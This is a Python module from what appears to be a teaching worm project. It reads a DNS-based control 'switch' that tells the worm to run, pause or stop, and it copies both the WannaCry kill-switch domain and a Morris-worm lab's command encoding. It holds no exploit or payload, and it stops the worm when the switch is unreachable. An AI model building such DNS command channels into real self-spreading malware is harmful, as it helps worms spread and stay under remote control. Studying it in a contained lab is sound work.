"""The worm's "keep going, pause or stop?" slot, answered by the switch machine.

The reader asks the switch machine directly for one name, over DNS. What the
answer means depends on the switch's mode:

    killswitch   the name has no address: run. It has one: stop. This is the
                 kill switch of the real WannaCry: the worm looked for a long
                 nonsense domain, found nothing, and went to work. When a
                 researcher registered the domain, new copies found it and
                 stopped.
    control      the first number of the address is the command, exactly as
                 in Prof. Du's Morris worm: 0 run, 1 stop, 2 pause.

In both modes, "the name is not registered" means run, and a switch machine
that does not answer at all is never a "go": the reader raises instead, and
the worm stops.

Rules for this file: standard library only, and no import from the worm
package. It has to run on any machine the bundle lands on.
"""

from .dnsquery import query

SLOT = "control"

RUN, PAUSE, STOP = "run", "pause", "stop"
MODES = ("control", "killswitch")

#: Prof. Du's encoding (control_worm.sh): 0.0.0.0 is run, 1.0.0.0 is stop,
#: 2.0.0.0 is pause. His 10.0.0.0 ("show") and 11.0.0.0 ("off") only change how
#: his worm is drawn on a map, so for a worm they mean: keep going.
COMMANDS = {0: RUN, 1: STOP, 2: PAUSE}


class SwitchUnreachable(Exception):
    """The switch machine did not answer. The worm must stop rather than guess."""


def conclude(mode: str, state, address) -> str:
    """What the state of the switch's record means for the worm."""
    if state is None:
        raise SwitchUnreachable("the switch machine did not answer")
    if state == "refused":
        raise SwitchUnreachable(
            "the switch machine answered, but refused to speak for the name: "
            "is it a name inside the switch's zone?"
        )
    if address is None:
        return RUN                # the name is not registered: the worm goes on
    if mode == "killswitch":
        return STOP               # registered: the kill switch is thrown
    return COMMANDS.get(int(address.split(".")[0]), RUN)


class SwitchReader:
    """Its fields are plain data, so the worm can write them into its settings file."""

    SLOT = SLOT

    def __init__(self, domain, mode="killswitch", server=None, port=53, timeout=2.0, tries=3):
        self.domain = domain
        self.mode = mode
        self.server = server          # the switch machine's address; the switch fills it in
        self.port = port              # where the switch machine answers DNS questions
        self.timeout = timeout
        self.tries = tries

    def answer(self) -> str:
        """Ask the switch machine: "run", "pause" or "stop"."""
        if not self.server:
            raise SwitchUnreachable("no switch machine is known: the switch was not installed")
        state, address = query(self.server, self.domain, self.timeout, self.tries, self.port)
        return conclude(self.mode, state, address)
